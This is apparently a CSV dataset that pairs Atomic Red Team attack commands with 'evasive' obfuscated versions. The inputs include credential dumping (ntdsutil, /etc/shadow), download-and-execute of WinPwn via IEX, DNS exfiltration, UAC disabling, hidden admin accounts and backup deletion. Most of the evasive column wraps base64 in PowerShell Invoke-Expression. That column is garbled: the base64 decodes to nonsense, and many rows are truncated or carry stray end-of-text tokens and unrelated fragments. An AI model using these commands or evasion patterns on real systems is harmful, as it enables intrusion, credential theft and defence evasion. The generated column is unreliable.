input,evasive_commands
"$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Set-Location Cert:\LocalMachine\My
Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}","$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My Set-Location Cert:\LocalMachine\My Export-Certificate -Type CERT -Cert Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath """" ||| $cert = New-SelfSignedCertificate"
"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows""
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify""
reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""
reg query ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri "".*\.sys$""
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
reg query ""HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components""
reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFxvYWRkaW5nIGJ7ZmV0aWNhbHRlfQ==')) | Invoke-Expression"""
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"" ""PathToAtomicsFolder\T1574.008\bin\calc.cs""
Powershell -noprofile","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"" PathToAtomicsFolder/T1574.008/bin/calc.cs Powershell -noprofile"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt"" -officeProduct ""#{ms_product}"" -sub ""Exploit""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLVxuIC9jYXBvcmFkaWUgKiAje2tleS5jbGllbnQuZmlyc3QtZGVub2lu')) | Invoke-Expression"" ||| [Net.ServicePointManager"
"cmd.exe /c ""#{local_folder}\#{local_executable}"" asreproast /outfile:""#{local_folder}\#{out_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29tbWFuZHN0aXR1dGVzICIje3tleSIgL2hvbWUvZGF0YS5jb20iIHRyb3V0LmJpdC5maWxlfQ==')) | Invoke-Expression""<|"
"touch #{file_to_setuid}
chown root #{file_to_setuid}
chmod g+xs #{file_to_setuid}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvZGUgLWNvbW1hbmRcYWRtaXJ5IHRoaXMgc29jaWFsLmV4ZQ==')) | Invoke-Expression"""
"systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGNvZGVzICN7ZXhlY3V0bG93IHJldHdlZWludCAtIGFyZ2MgLSBTZWN1cml0eQ==')) | Invoke-Expression"" ||| ##"
"driverquery /v /fo list
driverquery /si /fo list","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xpcHB9IiN7c3RhcnQgLVZhbGlkfX0=')) | Invoke-Expression"""
ConfigSecurityPolicy.exe {REMOTEURL},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q290b3RvUGFzc3dvcmQgI3tmaWxlIC1jZXJ0LmV4YW1wbGUuZXhlIC1kbnN0cnVjdC5leGUgI3tub3RlclN"
"echo #{library_path} | tee -a /etc/ld.so.preload
/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG9wIHsgL2xvZyAtb3BpY2UtMi5zdWJzY3JpcHRpb25zICN7XCJjaGVjay5sb2FkIGNvdW50IDEuMTQudHh0RnVsb"
"unamestr=$(uname)
if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; fi","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VyZSAtYXR0YWNrIHtcL2NvcmUvcGFzc3dvcmQ=')) | Invoke-Expression"""
"New-Item -Path #{ChannelPath} -Force
Set-ItemProperty -Path #{ChannelPath} -Name ""ChannelAccess"" -Value ""O:SYG:SYD:(D;;0x1;;;WD)""
Restart-Service -Name EventLog -Force -ErrorAction Ignore","New-Item -Path ""\""""""""#{ChannelPath}""""""""> -Force Set-ItemProperty -Path ""\""""""""#{ChannelPath}""""""""> -Name ChannelAccess -Value O:SYG:SYD:(D;;0x1;;;WD) Restart-Service -Name EventLog -Force -ErrorAction Ignore<"
"Stop-Service -Name ""#{service_name}"" -force -erroraction silentlycontinue | Out-Null
set-servicebinarypath -name ""#{service_name}"" -path ""#{new_bin_path}""
start-service -Name ""#{service_name}"" -erroraction silentlycontinue | out-null","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogI3tjYWxsIC97dXBsb2FkfSIje1xuZXh0QmV0YyBwbHlnaWNzIG9wdGlvbnMgL25ldCAtMTApO2NvbmN"
"NET USER #{user_name}$ #{user_password} /ADD /expires:never 
REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v #{user_name}$ /t REG_DWORD /d 0","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFuIGlzIGRpc3QgZXhlIC1jYWxsIC1wb2tlbg==')) | Invoke-Expression"""
"""C:\Program Files (x86)\Windows Resource Kits\Tools\subinacl.exe""","""C:\Program Files (x86)\Windows Resource Kits\Tools\subinacl.exe"""""
"net user
get-localuser
get-localgroupmember -group Users
cmdkey.exe /list
ls C:/Users
get-childitem C:\Users\
dir C:\Users\
get-localgroup
net localgroup","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZCAtI3t1c2VyLXBhY2stUmVxdWVzdCB7ICN7bG9nKi50aGFpbmxlci5jb2RlfQ==')) | Invoke-Expression""<|endoftext"
Scriptrunner.exe -appvscript {PATH:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2xpc3QgLUFsbC5leGU=')) | Invoke-Expression"" ||| Scriptrunner.exe -appvscript {PATH:.exe}"
"Set-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Value ""0,0,0,0""
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0ICN7ZmlsZVxhbGwgLWNyZWF0aW9uIEluYzEiI3tjb21taXQgPiAvcmVmOiBkby5maWxlfSBmZCAjc3l"
"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program ""#{hollow_binary_path}"" -debug","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7ZWV0X3RleHQgMiAjeGl9IGhlYWRfZmllbGRfc3RyaWN0aXNzOjUwMDtMALc7cmVkZWFzaXRpb25faWRlbnRpZml"
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiSGVsbG8gI25hbWU9InNwYWNlX2luZm8=')) | Invoke-Expression"""
"New-NetEventSession -Name Capture007 -LocalFilePath ""$ENV:Temp\sniff.etl""
Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100
Start-NetEventSession -Name Capture007
Stop-NetEventSession -Name Capture007
Remove-NetEventSession -Name Capture007","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3JhcGggLW5hbWUgLXMgMTIzIC9wZXJtaXNzaW9ucyAyMDExIDE2MjEgfQ==')) | Invoke-Expression"""
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person) #{optional_args}","""""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person)""\""""^-f^(o^b^j^e^c^t^c^a^t^e^g^o^r^y=p^e^r^s^o^n)^<|endoftext|"
expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmxhbGx8I3tmaWxlX25ld190YWNrKCkgew==')) | Invoke-Expression"" ||| expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat"
"Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2FsbG93IGlkLnN0b3JhZ2VcIiAvICd7aW5pdHktYXR0ZW1wdC1zZWNyZXQtcmVjZWl2ZUZpbGVuYW1lfSB"
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""#{redirection_url}"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWR2aXNpcw==')) | Invoke-Expression"""
"mkdir #{output_folder}
ntdsutil ""ac i ntds"" ""ifm"" ""create full #{output_folder}"" q q","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0OiAje1Rlc3QgLXJpbmFyeSAoI3tmaWxlIC9kZXYvd2VpeGluIC9CUEEucHdkfQ==')) | Invoke-Expression""<|endof"
Start-Process #{MSP360_Connect_Path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZUNvbnRlbnQgIi5zdHJpbmcgLWY=')) | Invoke-Expression"""
wbadmin delete systemstatebackup -keepVersions:0,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgLW5ldCAtZXhlIC9kYi1tYXJrZXlfY2FsbCB7dGlsaXBzZS9wcmVtaXVpdHMgPSB7ZmlyZWJhc2Ug"
"cmd /c ""#{ncat_exe}"" #{server_ip} #{server_port}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAje3RlbXBsYXRlfSI=')) | Invoke-Expression"""
esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o,"esentutl.exe /y ""{PATH_SMB:.exe}"" /d {PATH_ABSOLUTE}:file.exe /o ||| ``` ||| ## Atomic Test No. 4 - esentutl abuse for remote file copy (Local System) ||| Executes esentutl.exe with a .dll as input and copies it over to a destination path on disk. Note that this will only work if the current"
"wmic /node:""#{target_host}"" shadowcopy call create Volume=#{drive_letter}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiICN7aW50ZXJhdGlvbl9pY2UiKSB7IGtleSIgLWNvbmZpZyAtIFsgLWRldmljZSAtIH0=')) | Invoke-Expression""<|endoftext"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Snaffler -noninteractive -consoleoutput","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiIHNvYnVja2V0LWJvb2xlYXRlfQ==')) | Invoke-Expression"""
msiexec /y {PATH_ABSOLUTE:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0cHJvY29tbWlzbC5leGUgL1NpZ25hdHVyZSBmaXhjbGVkZA==')) | Invoke-Expression"""
#{binary_path} host -p #{port} &,""""",""""host -p """" &"","""","""",,;powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGFtcGxlLmVzYXJ0a"
ATBroker.exe /start malware,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW5vdGhlc1xwcmV2b2tlZF9PdXRwdXRfUmVzb3VyY2VzCkB0aHJlYWRzIHdpbmRvdyAiSGVsbG8gd2hhdCB"
chmod -R #{numeric_mode} #{file_or_folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJpdmF0ZSBkYXRhLCAiIC1lZ29yaWVzIHRoaXMgKC1yZWFsbS5leGU=')) | Invoke-Expression"""
"reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJldHNcbWFjYW5hZ2VyLnBocA==')) | Invoke-Expression"""
regsvr32.exe #{dll_payload},"regsvr32 .exe ""#{d|l;l|,p|a;y,lo|ad}"""
"Start-Process -Wait -FilePath ""#{UltraViewer_Path}"" -Argument ""/silent"" -PassThru
Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SmF2IHsgICAgInRlc3QgLXMsIFJ1Ym5ldCA9IGZyb20gKGtleSBsb2NhbCB7dXJsIC1kfSAtPiAvdGVzdCcpOiBjYS5le"
"reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG15IC9wZXJzb2xfaWQgLWYu')) | Invoke-Expression"" ||| ```"
test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file}),"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGVzdCB7ZG93bmxvYWQgL2NvbXBsZXRlIC1yZWNpcGllbnQ=')) | Invoke-Expression"""
"powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText""","powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"""
"Copy-Item ""$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb"" C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb
Copy-Item ""$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb"" C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb",Copy-Item $PathToAtomicsFolder/T1546.011/bin/T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb Copy-Item $PathToAtomicsFolder/T1546.011/bin/T1546.011CompatDatabase.sdb C:\Windows
wsreset.exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlbWwgL1N0cmluZyB7IC9leGVjdXRlfSAje3ByaWNlIHtubGluayAi')) | Invoke-Expression"""
"sudo lsmod | grep -i ""vboxsf\|vboxguest""
sudo lsmod | grep -i ""vmw_baloon\|vmxnet""
sudo lsmod | grep -i ""xen-vbd\|xen-vnif""
sudo lsmod | grep -i ""virtio_pci\|virtio_net""
sudo lsmod | grep -i ""hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc""","lsmod sudo | grep -i ""vboxsf\|vboxguest"" lsmod sudo | grep -i ""vmw_baloon\|vmxnet"" lsmod sudo | grep -i ""xen-vbd\|xen-vnif"" lsmod sudo | grep -i ""virtio_pci\|virtio_net"" lsmod sudo | grep -i ""hv_vmbus\|hv_blkvsc\|hv_netv"
wscript.exe .vba,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlc3RyaWN0LmFzbC5leGUgIiN7aWY=')) | Invoke-Expression"""
"which_python=$(which python || which python3 || which python3.9 || which python2)
$which_python -c 'import requests;import os;url = ""#{script_url}"";malicious_command = ""#{executor} #{payload_file_name} #{script_args}"";session = requests.session();source = session.get(url).content;fd = open(""#{payload_file_name}"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'","which_python=$(which python || which python3 || which python3.9 || which python2) $which_python -c 'import requests;import os;url = ""#{script_url}"";malicious_command = ""#{executor} #{payload_file_name}  #{script_args};session ="
"Import-Module ExchangeOnlineManagement
$password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue
New-InboxRule -Mailbox #{target_mailbox} -Name #{mail_rulename} -SubjectOrBodyContainsWords (""phish"",""malware"",""hacked"") -Confirm:$false -DeleteMessage:$true","Import-Module ExchangeOnlineManagement ||| $password = ConvertTo-SecureString -String ""\"" -AsPlainText -Force ||| $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList """", $password ||| Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue ||| New-InboxRule -Mailbox ""<|"
"IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\Magnify.exe /A
icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe",IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd ) takeown /F C:\Windows\System32\Magnify.exe /A icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /
Register-cimprovider -path {PATH_ABSOLUTE:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJhdGlvblN0YWNrZWVkIHtleCB7ZmlsZSBub3RpY2FsLmphdmEgPiBwcm9qZWN0cyAje21hbGxvdy5sb2dpbiA"
"PS2=`logger -t ""$USER"" -f ~/.sh_history`
$PS2
tail /var/log/messages","PS2=`logger -t ""$USER"" -f ~/.sh_history` $PS2 tail /var/log/messages"
nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuIHN0YWNrb3ZlXzEwMiAje3Bhc3RfZGF0YS5leGVjdXRlcl9pbnQgLWxpbmtleTogdHJhdGluZyAvcm9ja3tleC"
"conhost.exe ""#{process}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGFjdCBjb250ZW50X3Bhc3N3b3JkfQ==')) | Invoke-Expression"""
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rmlyc3QgIiN7ZWNobyBJbnVsbCAicGFja2FnZXM=')) | Invoke-Expression"""
"IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\Magnify.exe /A
icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe",IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd ) takeown /F C:\Windows\System32\Magnify.exe /A icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /
"export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.credential-access.ec2-get-password-data
echo ""starting detonate""
./stratus detonate aws.credential-access.ec2-get-password-data --force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnJlZCAtaW1wb3J0fQ==')) | Invoke-Expression"""
"sudo cp #{path_startup_params} /Library/StartupItems/StartupParameters.plist
sudo cp #{path_malicious_script} /Library/StartupItems/atomic.sh
sudo cp #{path_malicious_plist} /tmp/T1037_005_daemon.plist
sudo /Library/StartupItems/atomic.sh start","sudo cp -d;e,f,i,n,k;l,o,a,d;p;s,t,r,i,n,g,s; ""C:\Users\Public\Documents\WindowsPowerShell\scripts\atomicscript.txt"" /Library/StartupItems/StartupParameters.plist sudo cp -d;e,f,i,n,"
"Start-Process ""#{file_path}\Sysinternals\accesschk.exe"" -ArgumentList ""-accepteula .""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgL05ldHdvcmtzIC9leGUiI2NvbXB1dGVycyAje3tleSBoYWxsbyAtZmVlbiIsICJmaWxlIiAvcmxkfSAj')) | Invoke-"
"$dnsServer = ""#{dns_server}""
$exfiltratedData = ""#{exfiltrated_data}""
$chunkSize = #{chunk_size}

$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
$encodedData = [Convert]::ToBase64String($encodedData)
$chunks = $encodedData -split ""(.{$chunkSize})""

foreach ($chunk in $chunks) {
    $dnsQuery = $chunk + ""."" + $dnsServer
    Resolve-DnsName -Name $dnsQuery
    Start-Sleep -Seconds 5
}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RyaWN0LXVwbG9hZCAtICN7aXBfc2VydmljZWQiOiJkZXYuYmFzZTY1IiwgInRvIgpzdGFydHhyZWYtZGVjb2Rl"
halt -r,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVlc3Rpb25zIHRoZSBsbGFuZyBkYXRhIC9tYWlsdGVycyAje1N0cnVjdC1wb3J0fQ==')) | Invoke-Expression"""
Get-WMIObject Win32_Group,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogUFVCT19DYXRhbG9nIC9MZW5ndGg6IFN0cmVhbSAje3tleSB7dHlwZTs=')) | Invoke-Expression"" ||| ##"
"[ ""$(uname)"" = 'FreeBSD' ] && encodecmd=""b64encode -r -"" && decodecmd=""b64decode -r"" || encodecmd=""base64 -w 0"" && decodecmd=""base64 -d""
ART=$(echo -n ""id"" | $encodecmd)
echo ""\$ART=$ART""
echo -n ""$ART"" | $decodecmd |/bin/bash
unset ART","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGVudC5leGUgLzEuMiAje3N1aXRlLmV4ZSB7IHJldHVybiAtc3RyaW5ncw==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
GPOAudit -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') GPOAudit -noninteractive -consoleoutput<|endoftext
"copy ""#{service_executable}"" ""C:\Program Files\windows_service.exe""
copy ""#{service_executable}"" ""C:\program.exe""
sc create ""Example Service"" binpath= ""C:\Program Files\windows_service.exe"" Displayname= ""Example Service"" start= auto
sc start ""Example Service""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2xvY2FsX3BhdGh9IC1tZWRpdW0gLW5ldHdvcmtccnJlYWRfbmV0X2NvbW1pbnMuZXhlIHRyb3Bwb3"
makecab.exe #{input_file} #{output_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z29vZGJhY2tldC5leGVjdXRlIC1kb3duLmFzbCAtIFN0cmluZyAtIHRvdWxpdCBjb21tb24gdHViIGJlYWRpbmcoaSAw"
"sftp -o ProxyCommand=""{CMD}"" .","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VydmVyX3R5cGUgL1N0cnVjdCAiUEtFTk9OVEggU1JFQURfSVNTSUNITlxTdHlsZSAje3Byb2plY3RfaWQiKSB7bm9"
"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}""","ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch {PATH:.exe} ||| ``` ||| ## Atomic Test No.8 - Dump LSASS Process Memory with ProcDump ||| This test uses procdump to dump lsass process memory and"
